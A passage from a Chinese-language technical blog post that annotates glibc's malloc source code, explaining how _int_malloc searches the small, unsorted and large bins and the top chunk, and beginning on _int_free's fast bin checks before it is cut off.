<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb); <span class="comment">// 获取对应 small_bin 的 index</span></span><br><span class="line">  bin = bin_at(av, idx);    <span class="comment">// 获取对应的链表的地址 </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 并判断该 small_bin 是否为空或未初始化，同时最后一个chunk</span></span><br><span class="line">  <span class="comment">// (为空时`last(bin)==bin-&gt;bk==bin`(fd和bk指向自己)；</span></span><br><span class="line">  <span class="comment">//  未初始化时`last(bin)==0`)</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">      malloc_consolidate(av); <span class="comment">// small bin未初始化，进行一次初始化</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      set_inuse_bit_at_offset(victim, nb); <span class="comment">// 设置该chunk的in_use位</span></span><br><span class="line">      <span class="comment">// 从small bin中取出chunk</span></span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena) <span class="comment">// 非main_arena需要在标志位上标记</span></span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h4><p>上接判断<code>if (in_smallbin_range(nb))</code>，除了在初始化small bin时会合并fastbin外，从small bin中获取chunk也失败也会执行fastbin的合并，并将这些空闲 chunk 加入 unsorted bin<br>中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  idx = largebin_index(nb);</span><br><span class="line">  <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着进入 bins 相关的各种操作(主要是切割chunk和分配chunk到对应bin)，这些操作被放入一个循环中。unsorted bin可以看作是small bin和large bin的cache，这两个bin中的chunk一定都曾位于unsorted bin中。分配时，如果在 unsorted bin 中有合适的 chunk，则直接；若没有合适的，就会把 unsorted bin 中的所有 chunk 分别加入到所属的 bin 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 反向遍历unsorted bin</span></span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">          __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">      size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        若申请的chunksize属于small chunk范围，unsorted bin当中只有一个</span></span><br><span class="line"><span class="comment">        chunk同时为last_remainder并且大小还大于待分配chunksize时(拗口)，</span></span><br><span class="line"><span class="comment">        并且能够切割(切割后仍为一个chunk，即符合最小大小)将尝试使用该</span></span><br><span class="line"><span class="comment">        last_remainder进行切割。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        即将unsorted_bin中的chunk重新置入其他bin，直至剩余最后一个chunk时(或者一开始只有一个chunk)时，</span></span><br><span class="line"><span class="comment">        会使用last_remainder尝试分配。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        这里重新尝试了分配small bin，因为若前面的smallbin未成功，</span></span><br><span class="line"><span class="comment">        则会合并的fastbin，那么可能会出现适合的smallbin</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 尝试分配last_remainder，这是唯一的从 unsorted bin 中分配 small chunk的情况</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset(victim, nb); <span class="comment">// 获取切割后的位置</span></span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder; <span class="comment">// 取出</span></span><br><span class="line">        <span class="comment">// 更新last_remainder，并重新链入unsorted bin</span></span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置chunk头，只有非best-fit分配时才需要设置chunk头，所以前面都没有</span></span><br><span class="line">        set_head(victim,</span><br><span class="line">                 nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 设置last_remainder头和prev_size</span></span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用last_remainder分配结束</span></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      <span class="comment">// 取出最后一个chunk</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 该chunk大小正好则直接返回 */</span></span><br><span class="line">      <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 不是正合适，则会将其放入small bin或large bin中 */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">        <span class="comment">// small chunk直接找到对应bin即可</span></span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">            large chunk稍微麻烦一些，找到对应范围的bin后，</span></span><br><span class="line"><span class="comment">            还得在该bin中找到一个比该chunk小的结点，插入其后。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck) &#123; <span class="comment">// bin非空</span></span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          <span class="comment">// 由于bin是一个循环双向链表，所以可以直接和bck-&gt;bk(此时bck是bin)进行比较，判断是否可直接插入</span></span><br><span class="line">          assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 不能快速插入则只能一个一个判断，但因为有fd_nextsize存在，所以可以先范围再精确的比较</span></span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fwd-&gt;size) <span class="comment">// 精准匹配到相同大小，则直接插入(设置fwd/bck指针)</span></span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// 没有相同大小，则先插入到xx_nextsize链表中(真插入)，再插入到fd/bk链表中</span></span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// large_bin为空则直接插入</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      <span class="comment">// fd/bk链表的真正插入操作</span></span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环的最大次数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       非small_chunk则在large_bins中查找，找出最适合或者最小大于nb的chunk</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">      bin = bin_at(av, idx); <span class="comment">// 获取bin指针</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="comment">// 检查该bin是否为空，申请size是否大于该bin中最大的chunk(first(bin)即bin中的第一个chunk)</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)) &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="comment">// 后向遍历xx_nextsize链表，找出一个大于申请size的chunk</span></span><br><span class="line">        <span class="keyword">while</span> (</span><br><span class="line">            ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size = chunksize(victim)) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)))</span><br><span class="line">          victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">           list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="comment">// 尽量避免从链表尾取出chunk，因为从链表中间取出chunk的话，fd和bk都指向另一个chunk，操作上来说，更方便取出(使用unlink宏)。</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">          victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="comment">// 检查remainder_size，若切割后不满足剩余部分仍为一个chunk，则不切割，直接分配出去</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">          set_inuse_bit_at_offset(victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 否则就切割，剩余部分放入unsorted_bin</span></span><br><span class="line">          remainder = chunk_at_offset(victim, nb);</span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">             have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks(av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head(victim,</span><br><span class="line">                   nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot(remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// large chunk分配结束</span></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       若还没将 chunk 分配出去，则在从bins中找到下一个更大的bin(对应更大的idx)</span></span><br><span class="line"><span class="comment">       中获取。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       通过位图能快速地检查bin是否为空，并找到对应bin获取chunk。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    ++idx;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// #define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)  ,BINMAPSHIFT=5</span></span><br><span class="line">    <span class="comment">// 找到对应block的下标，binmap使用block保存数据，实际上block是一个int数据，</span></span><br><span class="line">    <span class="comment">// 能保存32个chunk的使用情况，并且按大小排了序。</span></span><br><span class="line">    block = idx2block(idx); </span><br><span class="line">    <span class="comment">// 通过下标找到位图</span></span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    <span class="comment">// #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line">    <span class="comment">// 将idx对应的比特位设置为1，其它位为0。</span></span><br><span class="line">    bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">      <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">      <span class="comment">// bit与map比较，bit&gt;map则map中没有比所需大小大的chunk</span></span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123; <span class="comment">// 继续遍历，找下一个block，如果不存在，则使用top chunk</span></span><br><span class="line">          <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到对应bin</span></span><br><span class="line">        bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">      <span class="comment">// 找到map中符合条件的最小chunk，并得到对应bin</span></span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        bin = next_bin(bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert(bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">      <span class="comment">// 获取该bin中最后一个chunk</span></span><br><span class="line">      victim = last(bin);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">      <span class="comment">// bin为空，说明位图出错了，继续找bin</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin) &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin(bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">// 不为空，取出chunk，并继续判断切割条件和切割</span></span><br><span class="line">        size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">          set_inuse_bit_at_offset(victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">             have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks(av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head(victim,</span><br><span class="line">                   nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot(remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分配结束</span></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  use_top:</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       若bins中实在找不到适合的chunk，连分割都办不到，则会切割top_chunk。</span></span><br><span class="line"><span class="comment">       top_chunk保存av-&gt;top。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       av-&gt;top 的存在条件是`size &gt;= MINSIZE`，因此通过切割top_chunk</span></span><br><span class="line"><span class="comment">       完成分配后，若不满足这个条件了，则会重新补充一个top_chunk。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// top_chunk满足分配条件则直接切割并分配</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head(victim,</span><br><span class="line">               nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line">    <span class="comment">// top_chunk不满足分配，则合并fast_chunks</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av)) &#123;</span><br><span class="line">      malloc_consolidate(av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="comment">// 重新获取对应idx(先前获取更大bin时改变了)</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index(nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// 堆空间不足了，需要重新申请一次内存</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>chunk 的大小不属于 small_chunk 的范围则会合并空闲 fast_chunks</li>
<li>top_chunk 不满足分配会合并空闲 fast_chunks</li>
<li>unsorted_bin 的循环执行时，会将其中的chunks(last_remainder)分配到 small_bins 和 large_bins 中</li>
<li>unsorted_bin 中分配 chunk，先从last_remainder(unsorted_chunks(av)-&gt;bk)开始，接着是 small_bins，unsorted_bin，最后是 large_bins</li>
<li>bins 中以 bin-&gt;fd 为第一个 chunk，bin-&gt;bk 为最后一个 chunk，并且在large_bin中chunksize是从大到小递减的(fd/fd_nextsize方向)</li>
<li>分配顺序如下:<ul>
<li>从 fast_bin 中分配时，从fd开始(FILO)；</li>
<li>从 small_bin 中分配时，从bk开始(FIFO)；</li>
<li>从 unsorted_bin 中分配时，从bk开始(FIFO)；</li>
<li>从 large_bin 中分配时，会从fd开始，但large_bin中chunk的排序是按照大小排的；</li>
</ul>
</li>
</ul>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>同malloc，free也有封装函数__libc_free，命名类似malloc，实际作用的函数是_int_free。</p>
<p>还是先会进行一系列检查，主要是检查待释放地址和其大小是否合法(符号，大小范围和是否对齐)。</p>
<h4 id="fast-bin-1"><a href="#fast-bin-1" class="headerlink" title="fast bin"></a>fast bin</h4><p>首先进行的还是fast bin的判断，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 判断是否符合fast chunk的大小范围</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast()) </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS </span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">        bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="comment">// 默认TRIM_FASTBINS是0，因此不会执行，</span></span><br><span class="line">      <span class="comment">// 若设置该参数为true，则当fastchunk的下一个邻接chunk为top chunk时</span></span><br><span class="line">      <span class="comment">// 则不将释放的chunk放入fast bin</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下一个chunk的大小不能小于两倍的SIZE_SZ,并且</span></span><br><span class="line">    <span class="comment">// 下一个chunk的大小不能大于system_mem， 一般为132k</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem,</span><br><span class="line">                         <span class="number">0</span>)) &#123;</span><br><span 